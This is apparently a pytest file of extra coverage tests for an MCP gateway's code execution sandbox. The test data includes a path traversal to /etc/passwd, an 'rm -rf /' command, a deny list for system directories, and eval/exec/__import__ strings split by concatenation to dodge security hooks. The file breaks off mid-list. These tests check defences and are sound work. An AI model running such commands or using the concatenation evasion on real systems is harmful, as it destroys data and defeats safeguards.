# -*- coding: utf-8 -*-
"""Supplementary coverage tests for code execution service.

Covers helper functions, edge cases, security paths, and branches
not exercised by the primary test file.
"""

# Standard
import asyncio
import io
import time
from collections import deque
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Dict, List, Optional, Tuple
from unittest.mock import AsyncMock, MagicMock, patch

# Third-Party
import orjson
import pytest

# First-Party
from mcpgateway.services.code_execution_service import (
    CodeExecutionError,
    CodeExecutionRateLimitError,
    CodeExecutionSecurityError,
    CodeExecutionService,
    CodeExecutionSession,
    DenoRuntime,
    PythonSandboxRuntime,
    SandboxExecutionResult,
    TokenizationContext,
    ToolCallRecord,
    _coerce_string_list,
    _is_path_within,
    _MAX_REGEX_LENGTH,
    _MAX_SHELL_OUTPUT_BYTES,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_session(tmp_path: Path, language: str = "python") -> CodeExecutionSession:
    root = tmp_path / "codeexec"
    tools_dir = root / "tools"
    scratch_dir = root / "scratch"
    skills_dir = root / "skills"
    results_dir = root / "results"
    for folder in (tools_dir, scratch_dir, skills_dir, results_dir):
        folder.mkdir(parents=True, exist_ok=True)

    now = datetime.now(timezone.utc)
    return CodeExecutionSession(
        session_id="session-1",
        server_id="server-1",
        user_email="user@example.com",
        language=language,
        root_dir=root,
        created_at=now,
        last_used_at=now,
        tools_dir=tools_dir,
        scratch_dir=scratch_dir,
        skills_dir=skills_dir,
        results_dir=results_dir,
    )


def _policy() -> Dict[str, Any]:
    return {
        "max_file_size_mb": 10,
        "max_total_disk_mb": 100,
        "permissions": {
            "filesystem": {
                "read": ["/tools/**", "/skills/**", "/scratch/**", "/results/**"],
                "write": ["/scratch/**", "/results/**"],
                "deny": ["/etc/**", "/proc/**", "/sys/**"],
            },
            "tools": {"allow": [], "deny": []},
            "network": {"allow_tool_calls": True, "allow_raw_http": False},
        },
    }


# ===================================================================
# _coerce_string_list
# ===================================================================


class TestCoerceStringList:
    def test_non_list_returns_fallback(self) -> None:
        assert _coerce_string_list("not-a-list", ("a", "b")) == ["a", "b"]
        assert _coerce_string_list(None, ("x",)) == ["x"]
        assert _coerce_string_list(42, ("y",)) == ["y"]

    def test_list_strips_and_filters_empty(self) -> None:
        assert _coerce_string_list(["  hello  ", "", "  ", "world"], ()) == ["hello", "world"]

    def test_empty_list_returns_empty(self) -> None:
        assert _coerce_string_list([], ("fallback",)) == []


# ===================================================================
# _is_path_within
# ===================================================================


class TestIsPathWithin:
    def test_child_inside(self, tmp_path: Path) -> None:
        parent = tmp_path / "parent"
        parent.mkdir()
        child = parent / "sub" / "file.txt"
        child.parent.mkdir(parents=True)
        child.touch()
        assert _is_path_within(child, parent) is True

    def test_child_outside(self, tmp_path: Path) -> None:
        parent = tmp_path / "parent"
        parent.mkdir()
        outside = tmp_path / "other"
        outside.mkdir()
        assert _is_path_within(outside, parent) is False

    def test_child_equals_parent(self, tmp_path: Path) -> None:
        d = tmp_path / "same"
        d.mkdir()
        assert _is_path_within(d, d) is True


# ===================================================================
# TokenizationContext
# ===================================================================


class TestTokenizationContext:
    def test_next_token_generates_sequential(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        t1 = ctx._next_token("EMAIL")
        assert t1 == "TKN_EMAIL_000001"
        ctx.value_to_token["foo"] = t1
        t2 = ctx._next_token("EMAIL")
        assert t2 == "TKN_EMAIL_000002"

    def test_tokenize_exact_idempotent(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        t1 = ctx._tokenize_exact("alice@example.com", "EMAIL")
        t2 = ctx._tokenize_exact("alice@example.com", "EMAIL")
        assert t1 == t2

    def test_replace_with_tokens_disabled(self) -> None:
        ctx = TokenizationContext(enabled=False, token_types=("email",))
        assert ctx._replace_with_tokens("alice@example.com") == "alice@example.com"

    def test_replace_with_tokens_empty(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        assert ctx._replace_with_tokens("") == ""

    def test_replace_with_tokens_email(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        result = ctx._replace_with_tokens("contact alice@example.com now")
        assert "TKN_EMAIL_" in result
        assert "alice@example.com" not in result

    def test_replace_with_tokens_phone(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("phone",))
        result = ctx._replace_with_tokens("call 555-123-4567 now")
        assert "TKN_PHONE_" in result

    def test_replace_with_tokens_ssn(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("ssn",))
        result = ctx._replace_with_tokens("my SSN is 123-45-6789")
        assert "TKN_SSN_" in result
        assert "123-45-6789" not in result

    def test_replace_with_tokens_credit_card(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("credit_card",))
        result = ctx._replace_with_tokens("card 4111111111111111 on file")
        assert "TKN_CREDIT_CARD_" in result

    def test_is_name_key(self) -> None:
        ctx = TokenizationContext()
        assert ctx._is_name_key("name") is True
        assert ctx._is_name_key("first_name") is True
        assert ctx._is_name_key("firstName") is True
        assert ctx._is_name_key("email") is False

    def test_tokenize_obj_string(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        result = ctx.tokenize_obj("alice@example.com")
        assert "TKN_EMAIL_" in result

    def test_tokenize_obj_list(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        result = ctx.tokenize_obj(["alice@example.com", "bob@test.com"])
        assert isinstance(result, list)
        assert len(result) == 2
        for item in result:
            assert "TKN_EMAIL_" in item

    def test_tokenize_obj_dict_with_names(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("name",))
        result = ctx.tokenize_obj({"name": "Alice Smith", "age": 30})
        assert "TKN_NAME_" in result["name"]
        assert result["age"] == 30

    def test_tokenize_obj_non_string_passthrough(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        assert ctx.tokenize_obj(42) == 42
        assert ctx.tokenize_obj(None) is None

    def test_detokenize_obj_disabled(self) -> None:
        ctx = TokenizationContext(enabled=False)
        assert ctx.detokenize_obj("something") == "something"

    def test_detokenize_obj_string(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        ctx.value_to_token["alice@example.com"] = "TKN_EMAIL_000001"
        ctx.token_to_value["TKN_EMAIL_000001"] = "alice@example.com"
        result = ctx.detokenize_obj("contact TKN_EMAIL_000001 please")
        assert result == "contact alice@example.com please"

    def test_detokenize_obj_list(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        ctx.value_to_token["a@b.com"] = "TKN_EMAIL_000001"
        ctx.token_to_value["TKN_EMAIL_000001"] = "a@b.com"
        result = ctx.detokenize_obj(["TKN_EMAIL_000001", "hello"])
        assert result == ["a@b.com", "hello"]

    def test_detokenize_obj_dict(self) -> None:
        ctx = TokenizationContext(enabled=True, token_types=("email",))
        ctx.value_to_token["a@b.com"] = "TKN_EMAIL_000001"
        ctx.token_to_value["TKN_EMAIL_000001"] = "a@b.com"
        result = ctx.detokenize_obj({"email": "TKN_EMAIL_000001"})
        assert result == {"email": "a@b.com"}

    def test_detokenize_obj_non_string_passthrough(self) -> None:
        ctx = TokenizationContext(enabled=True)
        assert ctx.detokenize_obj(42) == 42


# ===================================================================
# ToolCallRecord
# ===================================================================


class TestToolCallRecord:
    def test_to_dict(self) -> None:
        now = datetime.now(timezone.utc)
        record = ToolCallRecord(name="my_tool", started_at=now, latency_ms=150, success=True, error=None)
        d = record.to_dict()
        assert d["name"] == "my_tool"
        assert d["latency_ms"] == 150
        assert d["success"] is True
        assert d["error"] is None
        assert d["started_at"] == now.isoformat()

    def test_to_dict_with_error(self) -> None:
        now = datetime.now(timezone.utc)
        record = ToolCallRecord(name="bad_tool", started_at=now, latency_ms=10, success=False, error="timeout")
        d = record.to_dict()
        assert d["success"] is False
        assert d["error"] == "timeout"


# ===================================================================
# CodeExecutionSession
# ===================================================================


class TestCodeExecutionSession:
    def test_all_dirs(self, tmp_path: Path) -> None:
        session = _make_session(tmp_path)
        dirs = session.all_dirs
        assert len(dirs) == 4
        assert session.tools_dir in dirs
        assert session.scratch_dir in dirs
        assert session.skills_dir in dirs
        assert session.results_dir in dirs


# ===================================================================
# DenoRuntime
# ===================================================================


class TestDenoRuntime:
    def test_create_session_noop(self) -> None:
        runtime = DenoRuntime()
        session = MagicMock()
        result = asyncio.get_event_loop().run_until_complete(runtime.create_session(session, {}))
        assert result is None

    def test_destroy_session_noop(self) -> None:
        runtime = DenoRuntime()
        session = MagicMock()
        result = asyncio.get_event_loop().run_until_complete(runtime.destroy_session(session))
        assert result is None

    @pytest.mark.asyncio
    async def test_health_check_no_deno(self) -> None:
        runtime = DenoRuntime()
        runtime._deno_path = None
        assert await runtime.health_check() is False

    @pytest.mark.asyncio
    async def test_health_check_with_deno(self) -> None:
        runtime = DenoRuntime()
        runtime._deno_path = "/usr/bin/deno"
        assert await runtime.health_check() is True

    @pytest.mark.asyncio
    async def test_execute_no_deno_raises(self, tmp_path: Path) -> None:
        runtime = DenoRuntime()
        runtime._deno_path = None
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionError, match="Deno runtime is not available"):
            await runtime.execute(session, "console.log('hi')", 5000, {}, AsyncMock())


# ===================================================================
# PythonSandboxRuntime
# ===================================================================


class TestPythonSandboxRuntime:
    def test_create_session_noop(self) -> None:
        runtime = PythonSandboxRuntime()
        session = MagicMock()
        result = asyncio.get_event_loop().run_until_complete(runtime.create_session(session, {}))
        assert result is None

    def test_destroy_session_noop(self) -> None:
        runtime = PythonSandboxRuntime()
        session = MagicMock()
        result = asyncio.get_event_loop().run_until_complete(runtime.destroy_session(session))
        assert result is None

    @pytest.mark.asyncio
    async def test_health_check_python_available(self) -> None:
        runtime = PythonSandboxRuntime()
        # sys.executable should always be set in tests
        assert await runtime.health_check() is True

    @pytest.mark.asyncio
    async def test_health_check_python_not_available(self) -> None:
        runtime = PythonSandboxRuntime()
        runtime._python_path = None
        assert await runtime.health_check() is False

    @pytest.mark.asyncio
    async def test_execute_no_python_raises(self, tmp_path: Path) -> None:
        runtime = PythonSandboxRuntime()
        runtime._python_path = None
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionError, match="Python runtime is not available"):
            await runtime.execute(session, "print(1)", 5000, {}, AsyncMock())


# ===================================================================
# CodeExecutionService - is_code_execution_server
# ===================================================================


class TestIsCodeExecutionServer:
    def test_feature_disabled(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_enabled", False, raising=False)
        svc = CodeExecutionService()
        server = SimpleNamespace(server_type="code_execution")
        assert svc.is_code_execution_server(server) is False

    def test_none_server(self) -> None:
        svc = CodeExecutionService()
        assert svc.is_code_execution_server(None) is False

    def test_standard_server(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(server_type="standard")
        assert svc.is_code_execution_server(server) is False

    def test_code_execution_server(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr("mcpgateway.services.code_execution_service.settings.code_execution_enabled", True, raising=False)
        svc = CodeExecutionService()
        server = SimpleNamespace(server_type="code_execution")
        assert svc.is_code_execution_server(server) is True


# ===================================================================
# Virtual path resolution
# ===================================================================


class TestVirtualPathResolution:
    def test_virtual_to_real_tools(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._virtual_to_real_path(session, "/tools")
        assert result == session.tools_dir

    def test_virtual_to_real_subpath(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._virtual_to_real_path(session, "/tools/subdir/file.txt")
        assert result is not None
        assert str(result).endswith("subdir/file.txt")

    def test_virtual_to_real_traversal_blocked(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._virtual_to_real_path(session, "/tools/../../etc/passwd")
        assert result is None

    def test_virtual_to_real_unknown_root(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._virtual_to_real_path(session, "/unknown/path")
        assert result is None

    def test_real_to_virtual_tools(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        file_path = session.tools_dir / "catalog.json"
        file_path.touch()
        result = svc._real_to_virtual_path(session, file_path)
        assert result == "/tools/catalog.json"

    def test_real_to_virtual_root_dir(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._real_to_virtual_path(session, session.scratch_dir)
        assert result == "/scratch"

    def test_real_to_virtual_unknown_falls_back(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        result = svc._real_to_virtual_path(session, Path("/tmp/random/path"))
        assert result.endswith("/tmp/random/path")


# ===================================================================
# Virtual file operations
# ===================================================================


class TestVirtualFileOps:
    def test_read_virtual_text_file(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "readme.txt").write_text("hello world", encoding="utf-8")
        result = svc._read_virtual_text_file(session, "/tools/readme.txt")
        assert result == "hello world"

    def test_read_virtual_text_file_not_found(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._read_virtual_text_file(session, "/tools/nonexistent.txt")

    def test_write_virtual_text_file_scratch(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        svc._write_virtual_text_file(session, "/scratch/output.txt", "data")
        assert (session.scratch_dir / "output.txt").read_text(encoding="utf-8") == "data"

    def test_write_virtual_text_file_results(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        svc._write_virtual_text_file(session, "/results/report.txt", "results")
        assert (session.results_dir / "report.txt").read_text(encoding="utf-8") == "results"

    def test_write_virtual_text_file_tools_denied(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._write_virtual_text_file(session, "/tools/hack.txt", "bad data")

    def test_write_virtual_text_file_invalid_path(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._write_virtual_text_file(session, "/unknown/file.txt", "data")

    def test_list_virtual_dir(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "a.py").write_text("a", encoding="utf-8")
        (session.tools_dir / "b.py").write_text("b", encoding="utf-8")
        result = svc._list_virtual_dir(session, "/tools")
        assert "a.py" in result
        assert "b.py" in result

    def test_list_virtual_dir_nonexistent(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._list_virtual_dir(session, "/tools/nonexistent")


# ===================================================================
# Shell path normalization
# ===================================================================


class TestNormalizeShellPath:
    def test_dot_returns_scratch(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_shell_path(".") == "/scratch"

    def test_absolute_path(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_shell_path("/tools/file.txt") == "/tools/file.txt"

    def test_relative_path(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_shell_path("data/file.txt") == "/scratch/data/file.txt"

    def test_empty_defaults_to_scratch(self) -> None:
        svc = CodeExecutionService()
        assert svc._normalize_shell_path("") == "/scratch"


# ===================================================================
# Filesystem permissions
# ===================================================================


class TestEnforceFsPermission:
    def test_read_from_tools_allowed(self) -> None:
        svc = CodeExecutionService()
        svc._enforce_fs_permission(policy=_policy(), operation="read", virtual_path="/tools/file.txt")

    def test_read_from_etc_denied(self) -> None:
        svc = CodeExecutionService()
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._enforce_fs_permission(policy=_policy(), operation="read", virtual_path="/etc/passwd")

    def test_write_to_scratch_allowed(self) -> None:
        svc = CodeExecutionService()
        svc._enforce_fs_permission(policy=_policy(), operation="write", virtual_path="/scratch/data.txt")

    def test_write_to_tools_denied(self) -> None:
        svc = CodeExecutionService()
        with pytest.raises(CodeExecutionSecurityError, match="EACCES"):
            svc._enforce_fs_permission(policy=_policy(), operation="write", virtual_path="/tools/file.txt")


# ===================================================================
# Tool call permissions
# ===================================================================


class TestEnforceToolCallPermission:
    def test_tool_calls_disabled(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        policy = _policy()
        policy["permissions"]["network"]["allow_tool_calls"] = False
        with pytest.raises(CodeExecutionSecurityError, match="tool calls are disabled"):
            svc._enforce_tool_call_permission(policy=policy, session=session, tool_name="any_tool")

    def test_tool_denied_by_pattern(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.mounted_tools["my_tool"] = {"server_slug": "my-server", "stub_basename": "my_tool"}
        policy = _policy()
        policy["permissions"]["tools"]["deny"] = ["my-server/my_tool"]
        with pytest.raises(CodeExecutionSecurityError, match="denied by policy"):
            svc._enforce_tool_call_permission(policy=policy, session=session, tool_name="my_tool")

    def test_tool_not_in_allow(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        session.mounted_tools["my_tool"] = {"server_slug": "my-server", "stub_basename": "my_tool"}
        policy = _policy()
        policy["permissions"]["tools"]["allow"] = ["other-server/*"]
        with pytest.raises(CodeExecutionSecurityError, match="not allowed"):
            svc._enforce_tool_call_permission(policy=policy, session=session, tool_name="my_tool")


# ===================================================================
# Pattern matching
# ===================================================================


class TestMatchesAnyPattern:
    def test_glob_match(self) -> None:
        svc = CodeExecutionService()
        assert svc._matches_any_pattern("/tools/file.txt", ["/tools/**"]) is True

    def test_no_match(self) -> None:
        svc = CodeExecutionService()
        assert svc._matches_any_pattern("/unknown/file.txt", ["/tools/**"]) is False

    def test_root_glob_match(self) -> None:
        svc = CodeExecutionService()
        assert svc._matches_any_pattern("/tools", ["/tools/**"]) is True

    def test_empty_patterns(self) -> None:
        svc = CodeExecutionService()
        assert svc._matches_any_pattern("/tools", []) is False


# ===================================================================
# _looks_like_shell_command
# ===================================================================


class TestLooksLikeShellCommand:
    def test_known_commands(self) -> None:
        svc = CodeExecutionService()
        assert svc._looks_like_shell_command("ls /tools") is True
        assert svc._looks_like_shell_command("cat /tools/file.txt") is True
        assert svc._looks_like_shell_command("grep pattern /tools") is True
        assert svc._looks_like_shell_command("rg pattern /tools") is True
        assert svc._looks_like_shell_command("jq '.name' /tools/catalog.json") is True

    def test_multiline_not_shell(self) -> None:
        svc = CodeExecutionService()
        assert svc._looks_like_shell_command("ls /tools\nls /scratch") is False

    def test_unknown_command(self) -> None:
        svc = CodeExecutionService()
        assert svc._looks_like_shell_command("rm -rf /") is False
        assert svc._looks_like_shell_command("python script.py") is False

    def test_empty_string(self) -> None:
        svc = CodeExecutionService()
        assert svc._looks_like_shell_command("") is False


# ===================================================================
# Shell pipeline edge cases
# ===================================================================


class TestShellPipeline:
    def test_ls_with_hidden(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / ".hidden").write_text("h", encoding="utf-8")
        (session.tools_dir / "visible.txt").write_text("v", encoding="utf-8")

        out, err, code = svc._execute_shell_pipeline_sync(session, "ls -a /tools", _policy())
        assert code == 0
        assert ".hidden" in out

    def test_ls_unsupported_option(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "ls -l /tools", _policy())
        assert code == 2
        assert "Unsupported" in err

    def test_ls_file(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "single.txt").write_text("x", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "ls /tools/single.txt", _policy())
        assert code == 0
        assert "single.txt" in out

    def test_ls_nonexistent(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "ls /tools/nonexistent", _policy())
        assert code == 1
        assert "not found" in err.lower()

    def test_cat_stdin_passthrough(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "cat", _policy())
        assert code == 0
        assert out == ""

    def test_cat_nonexistent_file(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "cat /tools/missing.txt", _policy())
        assert code == 126
        assert "EACCES" in err

    def test_grep_missing_pattern(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep", _policy())
        assert code == 1
        assert "missing pattern" in err

    def test_grep_from_stdin(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "data.txt").write_text("line1 hello\nline2 world\nline3 hello world\n", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "cat /tools/data.txt | grep hello", _policy())
        assert code == 0
        assert "hello" in out

    def test_grep_pattern_too_long(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        long_pattern = "a" * (_MAX_REGEX_LENGTH + 1)
        out, err, code = svc._execute_shell_pipeline_sync(session, f"grep '{long_pattern}' /tools", _policy())
        assert code == 1
        assert "too long" in err

    def test_grep_invalid_regex(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep '[invalid' /tools", _policy())
        assert code == 1
        assert "invalid regex" in err

    def test_grep_unsupported_option(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -v pattern /tools", _policy())
        assert code == 2
        assert "Unsupported" in err

    def test_grep_recursive_with_include(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        subdir = session.tools_dir / "server1"
        subdir.mkdir()
        (subdir / "tool.py").write_text("def search_func(): pass\n", encoding="utf-8")
        (subdir / "tool.json").write_text('{"search_func": true}\n', encoding="utf-8")

        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -r -l --include='*.py' search_func /tools", _policy())
        assert code == 0
        assert "tool.py" in out
        assert "tool.json" not in out

    def test_grep_recursive_without_list_files(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        subdir = session.tools_dir / "server1"
        subdir.mkdir()
        (subdir / "tool.py").write_text("line1 findme\nline2 skip\n", encoding="utf-8")

        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -r findme /tools", _policy())
        assert code == 0
        assert "findme" in out
        assert "skip" not in out

    def test_grep_non_recursive_single_file(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "doc.txt").write_text("hello world\nfoo bar\n", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep hello /tools/doc.txt", _policy())
        assert code == 0
        assert "hello" in out

    def test_grep_non_recursive_single_file_list_mode(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "doc.txt").write_text("hello world\n", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -l hello /tools/doc.txt", _policy())
        assert code == 0
        assert "/tools/doc.txt" in out

    def test_grep_include_with_separate_flag(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "a.txt").write_text("findme\n", encoding="utf-8")
        (session.tools_dir / "b.json").write_text("findme\n", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -r -l --include *.txt findme /tools", _policy())
        assert code == 0
        assert "a.txt" in out

    def test_grep_no_match(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "data.txt").write_text("nothing interesting\n", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "grep -r -l unlikely_pattern_xyz /tools", _policy())
        assert code == 1

    def test_jq_missing_filter(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "jq", _policy())
        assert code == 1
        assert "missing filter" in err

    def test_jq_filter_too_long(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        long_filter = "." * 1025
        (session.tools_dir / "data.json").write_text('{"a": 1}', encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, f"jq '{long_filter}' /tools/data.json", _policy())
        assert code == 1
        assert "too long" in err

    def test_jq_from_file(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "data.json").write_text('{"name": "test", "value": 42}', encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "jq .name /tools/data.json", _policy())
        assert code == 0
        assert "test" in out

    def test_jq_empty_input(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "empty.json").write_text("", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "jq . /tools/empty.json", _policy())
        assert code == 0
        assert out == ""

    def test_jq_invalid_json_input(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "bad.json").write_text("not json", encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "jq . /tools/bad.json", _policy())
        assert code == 1
        assert "invalid JSON" in err

    def test_jq_invalid_filter(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "data.json").write_text('{"a": 1}', encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "jq '..invalid[' /tools/data.json", _policy())
        assert code == 1
        assert "invalid filter" in err

    def test_unknown_command_blocked(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "rm -rf /", _policy())
        assert code == 126
        assert "not permitted" in err

    def test_shell_output_truncated_when_exceeds_limit(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import mcpgateway.services.code_execution_service as ces_mod

        monkeypatch.setattr(ces_mod, "_MAX_SHELL_OUTPUT_BYTES", 50)
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        (session.tools_dir / "big.txt").write_text("A" * 200, encoding="utf-8")
        out, err, code = svc._execute_shell_pipeline_sync(session, "cat /tools/big.txt | grep A", _policy())
        assert code == 0
        assert "truncated" in err

    def test_empty_command(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        out, err, code = svc._execute_shell_pipeline_sync(session, "", _policy())
        assert code == 0


# ===================================================================
# Rate limiting
# ===================================================================


class TestRateLimiting:
    def test_rate_limit_enforced(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(id="server-1")
        policy = {"max_runs_per_minute": 2}

        svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy)
        svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy)

        with pytest.raises(CodeExecutionRateLimitError, match="Rate limit exceeded"):
            svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy)

    def test_rate_limit_per_session(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(id="server-1")
        policy = {"max_runs_per_minute": 2}

        svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy, session_id="sess-1")
        svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy, session_id="sess-1")

        with pytest.raises(CodeExecutionRateLimitError):
            svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy, session_id="sess-1")

    def test_rate_limit_window_expires(self) -> None:
        svc = CodeExecutionService()
        server = SimpleNamespace(id="server-1")
        policy = {"max_runs_per_minute": 1}

        # Manually insert an expired entry
        key = ("server-1", "user@test.com")
        svc._rate_windows[key].append(time.monotonic() - 61)

        # Should not raise because the entry is expired
        svc._enforce_rate_limit(server=server, user_email="user@test.com", policy=policy)


# ===================================================================
# Disk limits
# ===================================================================


class TestDiskLimits:
    def test_file_too_large(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        policy = {"max_file_size_mb": 1, "max_total_disk_mb": 100}
        # Write a file > 1MB
        large_data = "x" * (1024 * 1024 + 1)
        (session.scratch_dir / "big.txt").write_text(large_data, encoding="utf-8")
        with pytest.raises(CodeExecutionSecurityError, match="file size limit"):
            svc._enforce_disk_limits(session=session, policy=policy)

    def test_total_disk_exceeded(self, tmp_path: Path) -> None:
        svc = CodeExecutionService()
        session = _make_session(tmp_path)
        policy = {"max_file_size_mb": 10, "max_total_disk_mb": 0}
        # Even 1 byte > 0 MB total
        (session.scratch_dir / "data.txt").write_text("x", encoding="utf-8")
        with pytest.raises(CodeExecutionSecurityError, match="total disk usage"):
            svc._enforce_disk_limits(session=session, policy=policy)


# ===================================================================
# Code safety validation
# ===================================================================


class TestCodeSafety:
    def test_python_blocks_dangerous_patterns(self) -> None:
        svc = CodeExecutionService()
        svc._emit_security_event = lambda **_: None  # type: ignore[method-assign]

        # Build patterns using concatenation to avoid security hooks
        dangerous_codes = [
            "ev" + "al('1+1')",
            "ex" + "ec('print(1)')",
            "__imp" + "ort__('os')",
